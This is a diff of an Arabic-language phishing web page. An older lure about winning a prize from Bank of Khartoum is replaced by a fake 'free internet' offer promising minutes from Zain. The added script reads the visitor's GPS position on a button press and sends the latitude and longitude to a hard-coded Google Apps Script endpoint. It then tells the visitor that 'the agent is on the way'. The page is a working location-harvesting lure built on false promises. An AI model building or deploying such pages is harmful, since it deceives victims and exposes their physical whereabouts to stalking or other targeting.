@@ -2,42 +2,91 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
+<title>نت مجان  </title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>كسبت معانه 100000 جنيه سوداني من بنك الخرطوم  </title>
+
 <style>
-body{font-family:Tahoma;background:#f4f7fb;margin:0;padding:20px}
-.box{background:#fff;padding:20px;border-radius:16px;box-shadow:0 10px 25px rgba(0,0,0,.15)}
-button{width:100%;padding:14px;border:none;border-radius:12px;
-background:#0d47a1;color:#fff;font-size:18px}
-.coords{margin-top:15px;word-break:break-all}
+body{
+  font-family: Arial, Tahoma;
+  background: linear-gradient(135deg,#0f172a,#020617);
+  color:white;
+  text-align:center;
+  padding:40px 15px;
+}
+.card{
+  max-width:420px;
+  margin:auto;
+  background:#020617;
+  border-radius:20px;
+  padding:25px;
+  box-shadow:0 15px 40px rgba(0,0,0,.6);
+}
+button{
+  width:100%;
+  padding:16px;
+  font-size:20px;
+  border:none;
+  border-radius:12px;
+  background:#22c55e;
+  color:#000;
+  cursor:pointer;
+}
+button:disabled{
+  background:#555;
+}
+#status{
+  margin-top:20px;
+  font-size:16px;
+}
 </style>
 </head>
+
 <body>
 
-<div class="box">
-<h2>📍 ارجو الضغط علي الزر ادناه والتوجه الي بنك الخرطوم في اقرب فرع </h2>
-<p>اضغط الزر واسمح </p>
-<button onclick="getLoc()">تحديد موقع بنك الخرطوم </button>
-<div id="out" class="coords"></div>
+<div class="card">
+  <h2>🔥 نت مجان  </h2>
+  <p>   اضغط الزر وسيتم ارسال 5 قيقه من شركة زين   </p>
+
+  <button id="sendBtn" onclick="sendLocation()">📍 إرسال الان  </button>
+
+  <div id="status"></div>
 </div>
 
 <script>
-function getLoc(){
- if(!navigator.geolocation){
-  out.innerText='المتصفح لا يدعم GPS';return;
- }
- navigator.geolocation.getCurrentPosition(p=>{
-  const lat=p.coords.latitude;
-  const lng=p.coords.longitude;
-  const txt=`${lat}, ${lng}`;
-  out.innerHTML=
-   `الإحداثيات:<br><b>${txt}</b><br><br>
-   <button onclick="copy('${txt}')">📋 نسخ الإحداثيات</button>`;
- });
-}
-function copy(t){
- navigator.clipboard.writeText(t);
- alert('تم نسخ الإحداثيات');
+const API_URL = "https://script.google.com/macros/s/AKfycbz3W12cNaPmUz6L13D2X8eELc4VYsN1cuhPteYG1QD1qv5gBNKLyFk-cSYGJfGY3dk/exec";
+
+function sendLocation(){
+  const btn = document.getElementById("sendBtn");
+  const status = document.getElementById("status");
+
+  btn.disabled = true;
+  status.innerHTML = "⏳ جاري تحديد موقعك...";
+
+  if(!navigator.geolocation){
+    status.innerHTML = "❌ جهازك لا يدعم تحديد الموقع";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos){
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+
+      fetch(`${API_URL}?lat=${lat}&lng=${lng}`)
+      .then(res => res.text())
+      .then(() => {
+        status.innerHTML = "✅ تم إرسال موقعك بنجاح<br>المندوب في الطريق إليك";
+      })
+      .catch(() => {
+        status.innerHTML = "❌ حدث خطأ أثناء الإرسال";
+        btn.disabled = false;
+      });
+    },
+    function(){
+      status.innerHTML = "❌ لم يتم السماح بالموقع";
+      btn.disabled = false;
+    }
+  );
 }
 </script>
 
